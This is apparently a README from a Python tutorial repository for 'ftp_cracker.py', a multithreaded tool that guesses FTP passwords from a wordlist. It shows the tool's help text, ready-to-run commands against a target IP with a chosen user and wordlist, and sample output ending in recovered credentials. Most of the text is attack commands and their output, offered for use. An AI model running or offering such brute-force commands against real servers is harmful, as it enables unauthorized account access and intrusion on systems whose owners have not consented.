# [How to Brute Force FTP Servers in Python](https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python)
To run this:
- `pip3 install -r requirements.txt`
- Use `ftp_cracker.py` for fast brute force:
    ```
    python ftp_cracker.py --help
    ```
    **Output:**
    ```
    usage: ftp_cracker.py [-h] [-u USER] [-p PASSLIST] [-t THREADS] host

    FTP Cracker made with Python

    positional arguments:
    host                  The target host or IP address of the FTP server

    optional arguments:
    -h, --help            show this help message and exit
    -u USER, --user USER  The username of target FTP server
    -p PASSLIST, --passlist PASSLIST
                            The path of the pass list
    -t THREADS, --threads THREADS
                            Number of workers to spawn for logining, default is 30
    ```
- If you want to use the wordlist `wordlist.txt` in the current directory against the host `192.168.1.2` (can be domain or private/public IP address) with the user `user`:
    ```
    python ftp_cracker.py 192.168.1.2 -u user -p wordlist.txt
    ```
- You can also tweak the number of threads to spawn (can be faster, default is 30):
    ```
    python ftp_cracker.py 192.168.1.2 -u user -p wordlist.txt --threads 35
    ```
- Output can be something like this:
    ```
    [!] Trying 123456
    [!] Trying 12345
    ...
    [!] Trying sweety
    [!] Trying joseph
    [+] Found credentials:
            Host: 192.168.1.113
            User: test
            Password: abc123
    ```